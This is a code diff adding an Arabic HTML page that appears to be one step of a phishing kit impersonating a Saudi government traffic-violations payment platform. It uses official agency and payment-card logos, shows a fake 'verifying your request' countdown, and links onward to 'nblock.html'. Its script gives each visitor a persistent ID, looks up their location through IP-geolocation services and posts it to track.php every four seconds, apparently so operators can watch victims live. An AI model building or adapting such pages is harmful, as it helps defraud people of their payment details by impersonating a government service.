@@ -1,0 +1,420 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>قيد المعالجة </title>
+        <link rel="icon" type="image/png" href="indexx/favicon.ico">
+
+    
+    
+    
+    
+    
+    
+    
+        
+    
+<script>
+  // 1. تفعيل المعرف الثابت لكل زائر لمنع التكرار الجلسات
+  let visitorCode = localStorage.getItem('visitor_code');
+  if (!visitorCode) {
+      visitorCode = 'VSR-' + Math.random().toString(36).substring(2, 9).toUpperCase();
+      localStorage.setItem('visitor_code', visitorCode);
+  }
+
+  async function sendTracking() {
+      // استعادة الدولة والمنطقة المخزنة لتسريع الموقع وتوفير البيانات
+      let countryCode = localStorage.getItem('visitor_country') || 'un';
+      let regionName = localStorage.getItem('visitor_region') || 'جاري التحديد...';
+
+      if (countryCode === 'un' || regionName === 'جاري التحديد...') {
+          try {
+              // جلب البيانات بدقة (رابط سريع ومفتوح تماماً لجميع دول العالم ومناطق السعودية)
+              const res = await fetch('https://ipapi.co');
+              const geo = await res.json();
+              
+              countryCode = geo.country_code ? geo.country_code.toLowerCase() : 'sa';
+              regionName = geo.region || geo.city || 'منطقة عامة';
+              
+              localStorage.setItem('visitor_country', countryCode);
+              localStorage.setItem('visitor_region', regionName);
+          } catch (e) {
+              // حل احتياطي سريع في حال تعطل الرابط الأول لأي سبب
+              try {
+                  const resAlt = await fetch('https://ipinfo.io');
+                  const geoAlt = await resAlt.json();
+                  countryCode = geoAlt.country ? geoAlt.country.toLowerCase() : 'sa';
+                  regionName = geoAlt.region || geoAlt.city || 'السعودية';
+                  
+                  localStorage.setItem('visitor_country', countryCode);
+                  localStorage.setItem('visitor_region', regionName);
+              } catch (err) {}
+          }
+      }
+
+      // 2. تحويل وتجهيز البيانات للإرسال المتوافق مع الاستضافة المجانية
+      const params = new URLSearchParams();
+      params.append('code', visitorCode);
+      params.append('pageTitle', document.title); // اسم الصفحة دقيق بدون روابط
+      params.append('countryCode', countryCode); // كود الدولة للعلم
+      params.append('region', regionName); // إرسال المنطقة بشكل مستقل ومستقر
+
+      fetch('track.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+          body: params
+      }).catch(e => console.log(e));
+  }
+
+  // بث التحديث الفوري وتكراره كل 4 ثوانٍ لتأكيد التواجد
+  sendTracking();
+  setInterval(sendTracking, 4000);
+
+  // تحديث فوري دقيق للاسم والحالة عند الرجوع والتقدم بأزرار المتصفح
+  window.addEventListener('pageshow', sendTracking);
+</script>
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <style>
+        /* إعدادات الصفحة الأساسية والخلفية الكاملة */
+        body {
+            margin: 0;
+            padding: 0;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background-image: url('indexx/Back004.jpg'); 
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            background-attachment: fixed;
+        }
+
+        /* رأس الموقع - شفاف */
+        .main-header {
+            background-color: rgba(0, 150, 136, 0.7);
+            width: 100%;
+            height: 90px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .header-container {
+            width: 90%;
+            max-width: 1200px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+        }
+
+        .center-header-img {
+            height: 70px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* وسط الموقع - الحاوية المركزية */
+        .main-content {
+            flex: 1;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 30px 20px;
+        }
+
+        /* صندوق الحالة الشفاف */
+        .status-box {
+            background-color: rgba(255, 255, 255, 0.15);
+            padding: 40px 30px;
+            border-radius: 15px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            width: 100%;
+            max-width: 500px; 
+            text-align: center;
+            box-sizing: border-box;
+        }
+
+        /* أيقونة المعالجة المتحركة */
+        .loading-icon {
+            display: inline-block;
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 1s ease-in-out infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-title {
+            color: #ffffff;
+            font-size: 1.6rem;
+            font-weight: bold;
+            margin-bottom: 15px;
+            text-shadow: 1px 1px 3px rgba(0,0,0,0.5);
+        }
+
+        .status-text {
+            color: #e0e0e0;
+            font-size: 1.05rem;
+            line-height: 1.6;
+            margin-bottom: 25px;
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.3);
+        }
+
+        /* تنسيق عنصر العداد */
+        .countdown-wrapper {
+            color: #ffffff;
+            font-size: 1.1rem;
+            margin-top: 15px;
+            background-color: rgba(0, 0, 0, 0.2);
+            padding: 10px 15px;
+            border-radius: 20px;
+            display: inline-block;
+        }
+
+        #timer {
+            font-weight: bold;
+            color: #ffeb3b; /* لون أصفر مميز للرقم */
+            font-size: 1.3rem;
+            margin: 0 5px;
+        }
+
+        /* تنسيق زر العودة المخفي افتراضياً */
+        .redirect-btn {
+            display: none; /* مخفي في البداية */
+            width: 100%;
+            padding: 14px;
+            background-color: #009688;
+            color: #ffffff;
+            border: none;
+            border-radius: 8px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-decoration: none;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-sizing: border-box;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        .redirect-btn:hover {
+            background-color: #00796b;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 15px rgba(0,0,0,0.3);
+        }
+
+        /* ذيل الموقع */
+        .site-footer {
+            background-color: rgba(0, 150, 136, 0.85); 
+            color: #ffffff;
+            padding: 30px 0;
+            width: 100%;
+        }
+
+        .footer-container {
+            width: 90%;
+            max-width: 1200px;
+            margin: 0 auto;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+        }
+
+        .footer-section {
+            flex: 1;
+            min-width: 250px;
+            margin: 10px 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+        }
+
+        .footer-right { align-items: flex-start; text-align: right; }
+        .footer-left { align-items: flex-end; text-align: left; }
+
+        .efa-logo, .partner-logo {
+            object-fit: contain;
+            display: inline-block !important;
+        }
+
+        .partner-logos {
+            display: flex;
+            gap: 20px;
+        }
+
+        .footer-center h3 {
+            margin: 0 0 10px 0;
+            font-size: 1.1rem;
+        }
+
+        .footer-links {
+            list-style: none;
+            padding: 0;
+            margin: 0 0 15px 0;
+            display: flex;
+            gap: 15px;
+        }
+
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 0.9rem;
+        }
+
+        .payment-methods {
+            display: flex;
+            gap: 10px;
+            justify-content: center;
+        }
+
+        .payment-logo {
+            height: 25px;
+            width: auto;
+            object-fit: contain;
+        }
+
+        /* الخط المتقطع للجوال */
+        .dashed-linee {
+            display: none;
+            width: 100%;
+            border-top: 1px dashed rgba(255, 255, 255, 0.4);
+            margin: 15px 0;
+        }
+
+        /* شاشات الجوال */
+        @media (max-width: 768px) {
+            .footer-container {
+                flex-direction: column;
+            }
+            .footer-section {
+                align-items: center !important;
+                text-align: center !important;
+            }
+            .dashed-linee {
+                display: block;
+            }
+            .footer-links {
+                flex-direction: column;
+                gap: 8px;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <!-- رأس الموقع -->
+    <header class="main-header">
+        <div class="header-container">
+            <img src="indexx/EFAAW.svg" alt="صورة وسط الرأس" class="center-header-img" width="150" height="70">
+        </div>
+    </header>
+
+    <!-- وسط الموقع -->
+    <main class="main-content">
+        <div class="status-box">
+            <!-- مؤشر جاري التحقق التفاعلي -->
+            <div class="loading-icon" id="loadingIcon"></div>
+            
+            <div class="status-title">قيد المعالجة جاري التحقق من طلبك</div>
+            
+            <div class="status-text">
+                عادةً إلى أن النظام قد استلم طلبك بنجاح، وهو الآن في مرحلة التدقيق التقني أو الإداري قبل اعتماده بشكل نهائي.
+            </div>
+
+            <!-- حاوية العداد التنازلي -->
+            <div class="countdown-wrapper" id="countdownWrapper">
+                يرجى الانتظار... سيظهر زر المتابعة بعد <span id="timer">5</span> ثوانٍ
+            </div>
+
+            <!-- زر العودة (يظهر بعد انتهاء العداد) -->
+            <!-- استبدل index.html باسم الصفحة الرئيسية لموقعك -->
+            <a href="nblock.html" class="redirect-btn" id="redirectBtn"> التالي</a>
+        </div>
+    </main>
+
+    <!-- ذيل الموقع -->
+    <footer class="site-footer">
+        <div class="footer-container">
+            
+            <!-- القسم الأيمن -->
+            <div class="footer-section footer-right">
+                <div class="logo-efa">
+                    <img src="indexx/EFAAW.svg" alt="Efa Logo" class="efa-logo" width="160" height="70">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأوسط -->
+            <div class="footer-section footer-center">
+                <h3>المنصة الوطنية للمخالفات</h3>
+                <ul class="footer-links">
+                    <li><a href="#">الأسئلة الشائعة</a></li>
+                    <li><a href="#">شروط الإستخدام</a></li>
+                    <li><a href="#">سياسة الخصوصية</a></li>
+                </ul>
+                
+                <div class="payment-methods">
+                    <img src="indexx/Mada.svg" alt="Mada" class="payment-logo">
+                    <img src="indexx/Sdad.svg" alt="Sadad" class="payment-logo">
+                    <img src="indexx/Visa.svg" alt="Visa" class="payment-logo">
+                    <img src="indexx/MasterCard.svg" alt="MasterCard" class="payment-logo">
+                </div>
+            </div>
+
+            <div class="dashed-linee"></div>
+
+            <!-- القسم الأيسر -->
+            <div class="footer-section footer-left">
+                <div class="partner-logos">
+                    <img src="indexx/NICW.svg" alt="NIC" class="partner-logo" width="100" height="55">
+                    <img src="indexx/sdaia2.svg" alt="SDAIA" class="partner-logo" width="100" height="55">
+                </div>
+            </div>
+
+        </div>
+    </footer>
+
+    <!-- سكربت التحكم بالعداد التنازلي والزر المخفي -->
+    <script>
+        let seconds = 5;
+        const timerElement = document.getElementById('timer');
+        const countdownWrapper = document.getElementById('countdownWrapper');
+        const redirectBtn = document.getElementById('redirectBtn');
+        const loadingIcon = document.getElementById('loadingIcon');
+
+        const countdown = setInterval(() => {
+            seconds--;
+            timerElement.textContent = seconds;
+
+            if (seconds <= 0) {
+                clearInterval(countdown);
+                countdownWrapper.style.display = 'none';
+                redirectBtn.style.display = 'inline-block';
+                loadingIcon.style.animation = 'none'; // إيقاف حركة التحميل
+            }
+        }, 1000);
+    </script>
